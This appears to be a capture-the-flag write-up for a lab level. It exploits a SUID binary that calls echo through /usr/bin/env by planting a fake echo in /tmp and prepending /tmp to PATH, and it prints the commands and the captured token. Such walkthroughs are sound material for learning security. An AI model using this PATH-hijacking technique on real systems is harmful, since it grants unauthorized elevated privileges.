## Level 03: Exploiting the Binary

### Objective
Retrieve the token by exploiting a binary named `level03`.

### Steps

1. **Analyze the Binary:**
   - Execute the binary:
     ```bash
     ./level03
     ```
     Output:  
     ```
     Exploit me
     ```
   - Inspect the binary:  
   The `strings` command extracts printable character strings from a binary file. You can then use `grep` to search for the desired phrase.
     ```bash
     strings level03 | grep "Exploit me"
     ```
     Output:  
     ```
     /usr/bin/env echo Exploit me
     ```

   The binary executes the `echo` command using `/usr/bin/env` without an absolute path. This behavior can be exploited by modifying the `PATH` environment variable.

2. **Understand the Vulnerability:**  
   - The `/usr/bin/env` command searches for the executable `echo` in the directories listed in the `PATH` environment variable.
   - By controlling the `PATH`, you can prioritize a malicious version of the `echo` command.

3. **Exploit the Vulnerability:**  
   - **Create a Malicious Executable:**  
      Create a fake `echo` command that executes `getflag`:
      ```bash
      echo "/bin/getflag" > /tmp/echo
      chmod +x /tmp/echo
      ```
   - **Modify the PATH Variable:**  
      Temporarily prepend `/tmp` to the `PATH`:
      ```bash
      export PATH=/tmp:$PATH
      ```
   - **Execute the Vulnerable Command:**  
      Run the binary:
      ```bash
      ./level03
      ```
      Output:  
      ```
      Here is your token: qi0maab88jeaj46qoumi7maus
      ```

4. **Why This Exploit Works:**
   - The binary `level03` likely has the SUID bit set, allowing it to run with the privileges of its owner (`flag03`).
   - When the modified `PATH` is used, the binary executes `/tmp/echo` (the malicious script) as if it were the real `echo` command.
   - Since `level03` runs with elevated privileges, it successfully executes `getflag` and retrieves the token.

5. **Verify SUID Permissions:**  
   Check if the SUID bit is set on the binary:
   ```bash
   ls -l ./level03
   ```
   Output:
   ```bash
   -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 ./level03
   ```
   The `s` in `rws` confirms that the binary runs with the privileges of its owner (in this case, `flag03`).
